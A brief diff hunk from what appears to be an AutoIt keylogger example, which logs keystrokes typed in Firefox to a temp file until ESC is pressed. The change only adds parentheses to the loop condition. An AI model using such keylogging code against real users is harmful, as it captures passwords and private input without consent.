@@ -14,7 +14,7 @@ _initWithFilename(@TempDir, "keylog-output")
 _logWindow("Firefox")
 
 ; With the _read()-function you can make your own conditional loops
-While not $key == "ESC"
+While not ($key == "ESC")
   _read()
 WEnd
 
